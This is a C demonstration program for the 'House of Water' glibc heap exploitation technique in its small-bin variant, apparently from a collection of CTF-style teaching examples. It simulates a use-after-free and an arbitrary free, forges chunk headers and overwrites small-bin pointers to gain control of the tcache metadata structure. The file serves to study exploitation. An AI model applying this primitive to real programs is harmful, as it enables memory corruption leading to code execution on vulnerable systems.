#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/* 
 * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a tcache
 * metadata control primitive.
 *
 * Modified House of Water: This technique no longer requires 4-bit bruteforce, even if you cannot increment integers.
 * There is no need to forge a size field inside the tcache structure, as the fake chunk is linked through a small bin.
 * An article explaining this newer variant and its differences from the original House of Water can be found at:
 * https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/House_Of_Water_Smallbin_Variant.md
 *
 * The technique starts by allocating the 'relative chunk' immediately after tcache metadata,
 * sharing the same ASLR-partially-controlled second nibble (which is 2) as the target fake chunk location.
 * 
 * Then it crafts fake tcache entries in the 0x320 & 0x330 bins using two other controlled chunks matching the 'relative chunk' size,
 * then frees all three chunks into the unsorted bin while keeping the 'relative chunk' centered.
 * A large allocation sorts them into the same small bin linked list.
 * 
 * UAF overwrites the LSB of the 'first chunk' fd and the 'end chunk' bk pointers with 0x00, redirecting both to the fake tcache chunk on the tcache.
 * Finally, it drains the tcache; the next allocation returns the 'first chunk' from the small bin and moves remaining chunks into tcache,
 * then the second allocation returns the 'end chunk', and the final allocation returns the fake chunk for `tcache_perthread_struct` control.
 *
 * Technique / house by @udp_ctf - Water Paddler / Blue Water 
 * Small-bin variant modified by @4f3rg4n - CyberEGGs.
 */



void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {
		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
	}	
}

int main(void) {
	// Dummy variable
	void *_ = NULL;

	// Prevent _IO_FILE from buffering in the heap
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 1           |");
	puts("\t==============================");
	puts("\n");

	// Step 1: Create the unsorted bins linked list, used for hijacking at a later time

	puts("Now, allocate three 0x90 chunks with guard chunks in between. This prevents");
	puts("chunk-consolidation and sets our target for the house of water attack.");
	puts("\t- chunks:");

	void *relative_chunk = malloc(0x88);
	printf("\t\t* relative_chunk\t@ %p\n", relative_chunk);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");

	void *small_start = malloc(0x88);
	printf("\t\t* small_start\t@ %p\n", small_start);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");

	void *small_end = malloc(0x88);
	printf("\t\t* small_end\t@ %p\n", small_end);
	_ = malloc(0x18); // Guard chunk
	
	puts("\t\t* /guard/");
	
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 2           |");
	puts("\t==============================");
	puts("\n");

	// Step 2: Fill up t-cache for 0x90 size class
	
	// This is just to make a pointer to the t-cache metadata for later.
	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff));

	// Make allocations to free such that we can exhaust the 0x90 t-cache
	puts("Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
	void *x[7];
	for (int i = 0; i < 7; i++) {
		x[i] = malloc(0x88);
	}

	puts("");

	// Free t-cache entries
	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by free'ing them.");
	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin");
	puts("instead of the t-cache or small-bins.");
	for (int i = 0; i < 7; i++) {
		free(x[i]);
	}

	
	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 3           |");
	puts("\t==============================");
	puts("\n");

	// Step 3: Create a 0x320 and a 0x330 t-cache entry which overlaps small_start and small_end.
	// By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!
		
	puts("Here comes the trickiest part!\n");
	
	puts("We essentially want a pointer in the 0x320 t-cache metadata to act as a FWD\n");
	puts("pointer and a pointer in the 0x330 t-cache to act as a BCK pointer.");
	puts("We want it such that it points to the chunk header of our small bin entries,\n");
	puts("and not at the chunk itself which is common for t-cache.\n");

	puts("Using a technique like house of botcake or a stronger arb-free primitive, free a");
	puts("chunk such that it overlaps with the header of unsorted_start and unsorted_end.");
	puts("");

	puts("It should look like the following:");
	puts("");
	
	puts("small_start:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x330][0/1], unsortedbin[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
	dump_memory(small_start, 2);
	puts("");

	puts("small_end:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x320][0/1], unsortedbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
	dump_memory(small_end, 2);

	puts("\n");
	puts("If you want to see a blind example using only double free, see the following chal: ");
	puts("https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki");
	puts("");
	puts("Note: See this if you want to see the same example but with the modified House of Water version: ");
	puts("https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/Tamagoyaki.md");
	puts("\n");

	puts("For the sake of simplicity, let's just simulate an arbitrary free primitive.");
	puts("\n");
	
	
	puts("--------------------");
	puts("|      PART 1      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 1:
	puts("Write 0x331 above small_start to enable its free'ing into the 0x330 t-cache.");
	printf("\t*%p-0x18 = 0x331\n", small_start);
	*(long*)(small_start-0x18) = 0x331;
	puts("");

	puts("This creates a 0x331 entry just above small_start, which looks like the following:");
	dump_memory(small_start-0x20, 3);
	puts("");

	printf("Free the faked 0x331 chunk @ %p\n", small_start-0x10);
	free(small_start-0x10); // Create a fake FWD
	puts("");
	
	puts("Finally, because of the meta-data created by free'ing the 0x331 chunk, we need to");
	puts("restore the original header of the small_start chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_start);
	*(long*)(small_start-0x8) = 0x91;
	puts("");

	puts("Now, let's do the same for small_end except using a 0x321 faked chunk.");
	puts("");


	puts("--------------------");
	puts("|      PART 2      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 2:
	puts("Write 0x321 above small_end, such that it can be free'd into the 0x320 t-cache:");
	printf("\t*%p-0x18 = 0x321\n", small_end);
	*(long*)(small_end-0x18) = 0x321;
	puts("");
	
	puts("This creates a 0x321 just above small_end, which looks like the following:");
	dump_memory(small_end-0x20, 3);
	puts("");
	
	printf("Free the faked 0x321 chunk @ %p\n", small_end-0x10);
	free(small_end-0x10); // Create a fake BCK
	puts("");
	
	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
	printf("\t*%p-0x8 = 0x91\n", small_end);
	*(long*)(small_end-0x8) = 0x91;
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 4           |");
	puts("\t==============================");
	puts("\n");

	// Step 4: Create the small bin list by freeing small_start, relative_chunk, small_end into the unsorted bin,
	// then allocate large chunk that will sort the unsorted bin into small bins.

	puts("Now, let's free the the chunks into the unsorted bin.");
	
	puts("\t> free(small_end);");
	free(small_end);
	
	puts("\t> free(relative_chunk);");
	free(relative_chunk);
	
	puts("\t> free(small_start);");
	free(small_start);
	
	puts("\n");

	puts("Now allocate a large chunk to trigger the sorting of the unsorted bin entries into the small bin.");
	_ = malloc(0x700);

	puts("");

	// Show the setup as is	
	
	puts("At this point, our heap looks something like this:");
	
	printf("\t- Small bin:\n");
	puts("\t\tsmall_start <--> relative_chunk <--> small_end");
	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, relative_chunk-0x10, small_end-0x10);
	
	printf("\t- 0x320 t-cache:\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x390));
	printf("\t- 0x330 t-cache\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x398));
	puts("");

	puts("The fake chunk in the t-cache will look like the following:");
	dump_memory(metadata+0x370, 4);
	puts("");

	puts("We can now observe that the 0x330 t-cache points to small_start and 0x320 t-cache points to ");
	puts("small_end, which is what we need to fake a small-bin entry and hijack relative_chunk.");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 5           |");
	puts("\t==============================");
	puts("\n");

	// Step 5: Overwrite LSB of small_start and small_end to point to the fake t-cache metadata chunk
	puts("Finally, all there is left to do is simply overwrite the LSB of small_start FWD-");
	puts("and BCK pointer for small_end to point to the faked t-cache metadata chunk.");
	puts("");

	// Note: we simply overwrite the LSBs of small_start and small_end with a single NULL byte instead of 0x90;
	// As a result, they point to our fake chunk in the tcache, which shares the same second-byte ASLR nibble (0x2) as the relative_chunk.

	/* VULNERABILITY */
	printf("\t- small_start:\n");
	printf("\t\t*%p = %p\n", small_start, metadata+0x200);
	*(unsigned long *)small_start = (unsigned long)(metadata+0x200);
	puts("");

	printf("\t- small_end:\n");
	printf("\t\t*%p = %p\n", small_end, metadata+0x200);
	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x200);
	puts("");
	/* VULNERABILITY */

	puts("At this point, the small bin will look like the following:");
	puts("");

	puts("\t- small bin:");
	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x200, small_end);


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 6           |");
	puts("\t==============================");
	puts("\n");

	// Step 6: allocate to win
	puts("Now, simply just allocate our fake chunk which is placed inside the small bin");
	puts("But first, we need to clean the t-cache for 0x90 size class to force malloc to");
	puts("service the allocation from the small bin.");

	for(int i = 7; i > 0; i--)
		_ = malloc(0x88);

	// Allocating small_start, and small_end again to remove them from the 0x90 t-cache bin
	_ = malloc(0x88);
	_ = malloc(0x88);


	// Next allocation *could* be our faked chunk!
	void *meta_chunk = malloc(0x88);

	printf("\t\tNew chunk\t @ %p\n", meta_chunk);
	printf("\t\tt-cache metadata @ %p\n", metadata);
	assert(meta_chunk == (metadata+0x210));

	puts("");
}
